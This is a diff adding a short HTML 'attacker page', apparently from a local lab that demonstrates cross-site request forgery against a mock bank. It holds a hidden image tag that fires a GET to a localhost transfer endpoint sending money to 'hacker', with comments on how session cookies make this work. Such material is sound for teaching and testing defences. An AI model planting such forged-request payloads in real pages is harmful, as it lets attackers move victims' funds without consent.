@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Attacker page (img trigger)</h2>
+    <p>
+      This page contains an image tag whose `src` is the bank's transfer
+      endpoint. If the user's browser includes the bank session cookie, the
+      browser will request this URL and the transfer will be attempted.
+    </p>
+
+    <!-- Browser will make a GET to the transfer endpoint with query params.
+         Note: The vulnerable server above expects POST; however many real-world apps accept GET or a state-changing GET (bad).
+         To make it submit a POST automatically, see attacker-form.html below that auto-submits a form. -->
+    <img
+      src="http://localhost:3000/transfer?to=hacker&amount=1000"
+      alt="stealth"
+      style="display: none"
+    />
+  </body>
+</html>
